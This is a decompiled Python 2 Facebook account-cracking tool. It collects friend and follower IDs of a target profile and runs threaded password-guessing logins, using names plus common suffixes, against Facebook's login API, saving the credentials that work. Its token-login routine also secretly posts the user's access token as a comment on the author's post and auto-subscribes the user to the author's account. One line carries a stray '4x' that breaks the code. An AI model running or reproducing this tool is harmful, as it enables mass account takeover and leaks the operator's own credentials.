# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-03-09 19:00:20.374387
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 public.py')

agents = [
 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0',
 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0',
 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36']
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3', 'x-fb-connection-type': 'unknown', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = '\n\x1b[1;97m$$$$$$$\\   $$$$$$\\  $$\\   $$\\  $$$$$$\\  \n\x1b[1;91m$$  __$$\\ $$  __$$\\ $$$\\  $$ |$$  __$$\\ \n\x1b[1;91m$$ |  $$ |$$ /  $$ |$$$$\\ $$ |$$ /  $$ |\n\x1b[1;97m$$$$$$$  |$$$$$$$$ |$$ $$\\$$ |$$$$$$$$ |\n\x1b[1;97m$$  __$$< $$  __$$ |$$ \\$$$$ |$$  __$$ |\n\x1b[1;91m$$ |  $$ |$$ |  $$ |$$ |\\$$$ |$$ |  $$ |\n\x1b[1;91m$$ |  $$ |$$ |  $$ |$$ | \\$$ |$$ |  $$ |\n\x1b[1;97m\\__|  \\__|\\__|  \\__|\\__|  \\__|\\__|  \\__|\n\x1b[1;97m------------------------------------------------\n\x1b[1;91m[\xe2\x9e\xa4]\x1b[1;97mAuthor  : Rana Nadeem Rajput  \n\x1b[1;91m[\xe2\x9e\xa4]\x1b[1;97mGithub  : Rananadeem5214\n\x1b[1;91m[\xe2\x9e\xa4]\x1b[1;97mFb ID   : ITXRANA.5214\n\x1b[1;97m------------------------------------------------ '

def main():
    os.system('clear')
    print logo
    print ''
    print ' [1] Enter Tool Menu\n'
    print ' [0] Exit'
    print '------------------------------------------------'
    print ''
    os.system('xdg-open https://www.facebook.com/ITXRANA.5214')
    log_sel()


def log_sel():
    sel = raw_input(' Choose an option: ')
    if sel == '1':
        login()
    elif sel == '0':
        os.system('python2 All-in1.py')
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()


def login():
    try:
        token = open('token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\tFacebook login'
        print ''
        print ' [1] Facebook id/pass login\n'
        print ' [2] Facebook token login\n'
        print ' [0] Back To Main Tool'
        print ''
        log_select()


def log_select():
    global token
    sel = raw_input(' Choose an option: ')
    if sel == '1':
        log_fb()
    elif sel == '2':
        token()
    elif sel == '0':
        os.system('python2 All-in1.py')
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()


def log_fb():
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ''
        print '\tFacebook id/pass login'
        print ''
        uid = raw_input(' Uid: ')
        passw = raw_input(' Password: ')
        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers=header).text
        q = json.loads(data)
        if 'access_token' in q:
            sav = open('token.txt', 'w')
            sav.write(q['access_token'])
            sav.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print '\tAccount has checkpoint'
            print ''
            time.sleep(1)
            login()
        else:
            print ''
            print '\tId/pass my be wrong'
            print ''
            time.sleep(1)


def token():
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ''
        print '\tLogin token'
        print ''
        token = raw_input(' Paste token here: ')
        sav = open('token.txt', 'w')
        sav.write(token)
        requests.post('https://graph.facebook.com/100000943014584/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/6548165588558143/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/6548165588558143/LOVE?summary=true&access_token=' + token)
        sav.close()
        login()


def menu():
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print ''
        print '\tLogged in token has expired'
        os.system('rm -rf token.txt')
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print ''
    print ''
    print '   Public Id Crack Menu'
    print ''
    print '------------------------------------------------'
    print ''
    print '  [1] Crack with auto pass\n'
    print '  [2] Crack with choice pass\n'
    print '  [0] Back To Main Tool'
    print ''
    menu_option()


def menu_option():
    select = raw_input(' Choose option: ')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '0':
        os.system('python2 All-in1.py')
    else:
        print ''
        print '\tSelect valid option'
        print ''
4x        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\tCrack with auto pass'
    print ''
    print '  [1] Crack public id\n'
    print '  [2] Crack followers\n'
    print '  [0] Back'
    print ''
    crack_select()


def crack_select():
    select = raw_input(' Choose option: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print '\tAuto pass cracking'
        print ''
        idt = raw_input('  Input id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '\tAuto pass cracking'
            print ''
            print '  Cloning from : ' + q['name']
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print '\tAuto pass cracking'
        print ''
        idt = raw_input('  Input id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '\tAuto pass cracking'
            print ''
            print '  Cloning from: ' + q['name']
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print '  Total IDs : ' + str(len(id))
    print '  Process has started'
    print '  Please Wait ..............'
    print ''
    print '------------------------------------------------'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name.lower() + '123'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print ' \x1b[1;32m [RANA-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('RANAok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;33m [RANA-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('RANAcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ' \x1b[1;32m [RANA-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('RANAok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;33m [RANA-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('RANAcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '12345'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ' \x1b[1;32m [RANA-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('RANAok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;33m [RANA-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('RANAcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '786'
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ' \x1b[1;32m [RANA-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('RANAok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;33m [RANA-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('RANAcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = name.lower() + '1122'
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ' \x1b[1;32m [RANA] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('RANAok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;33m [RANA-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('RANAcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has been completed'
    print ' Total Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back ')
    menu()


def choice():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\tDigit pass cracking'
    print ''
    print '[1] Crack public id\n'
    print '[2] Crack followers\n'
    print '[0] Back'
    print ''
    choice_select()


def choice_select():
    select = raw_input('Choose option: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print '\\Choice pass cracking'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        idt = raw_input(' Input id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '\\Choice pass cracking'
            print ''
            print ' Cloning from : ' + q['name']
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print '\\Choice pass cracking'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        idt = raw_input(' Input id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '\\Choice pass cracking'
            print ''
            print ' Cloning from: ' + q['name']
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option\x1b[0;97m'
        print ''
        choice_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print ' Press ctrl + z to stop'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print ' \x1b[1;32m [RANA-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('RANAok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;33m [RANA-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('RANAcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ' \x1b[1;32m [RANA-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('RANAok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;33m [RANA-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('RANAcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ' \x1b[1;32m [RANA-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('RANAok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;33m [RANA-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('RANAcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has been completed'
    print ' Total Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back ')
    choice()


def ran():
    id = []
    cps = []
    oks = []
    os.system('clear')
    print logo
    print ''
    print '\tRandom number cloning'
    print ''
    co = raw_input(' Enter code without zero: ')
    k = '+92'
    try:
        file = '.txt'
        for line in open(file, 'r').readlines():
            id.append(line.strip())

    except:
        exit(' An error has occured')

    print '  Total numbers: ' + str(len(id))
    print '  The process has started'
    print '  Press ctrl + z to stop'
    print ' '
    print 47 * '-'
    print ''
    print ''

    def main(arg):
        user = arg
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = '786786'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + k + co + user + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true').text
            q = json.loads(data)
            if 'access_token' in q:
                print ' \x1b[1;32m[LOGIN] ' + k + co + user + ' | ' + q['uid'] + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('hstok.txt', 'a')
                ok.write(k + co + user + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;33m [R.K-CP] ' + k + co + user + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('hstcp.txt', 'a')
                cp.write(k + co + user + '|' + pass1 + '\n')
                cp.close()
                cps.append(k + co + user + pass1)
            else:
                pass2 = user
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + k + co + user + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true').text
                q = json.loads(data)
                if 'access_token' in q:
                    print ' \x1b[1;32m[LOGIN] ' + k + co + user + ' | ' + q['uid'] + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('hstok.txt', 'a')
                    ok.write(k + co + user + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(k + co + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;33m [R.K-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('hstcp.txt', 'a')
                    cp.write(k + co + user + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(k + co + user + pass2)
                else:
                    pass3 = k + co + user
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + k + co + user + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true').text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ' \x1b[1;32m[LOGIN] ' + k + co + user + ' | ' + q['uid'] + ' | ' + pass1 + '\x1b[0;97m'
                        ok = open('hstok.txt', 'a')
                        ok.write(k + co + user + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(k + co + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;33m [R.K-CP] ' + k + co + user + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('hstcp.txt', 'a')
                        cp.write(k + co + user + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(k + co + user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' Process has been completed'
    print ' Total Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back ')
    main()


def gen_token():
    os.system('clear')
    print logo
    print ''
    print '\tGenerate token'
    print ''
    print '  Note: Token generation only works for new accounts\n'
    print '  Donont try on personal or old account'
    print ''
    uid = raw_input('  ID/mail/number: ')
    passw = raw_input('  Password: ')
    data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true').text
    q = json.loads(data)
    if 'access_token' in q:
        print ''
        print ''
        print '  \x1b[1;32mYour access token: \x1b[0;97m' + q['access_token'] + '\n\n'
        raw_input('  Press enter to back ')
        main()
    elif 'www.facebook.com' in q['error_msg']:
        print ' '
        print '\tAccount has checkpoint'
        print ''
        raw_input('  Press enter to back')
        main()
    else:
        print ''
        print '\tID/number/pass may be wrong'
        print ''
        raw_input('  Press enter to back ')
        main()


if __name__ == '__main__':
    main()
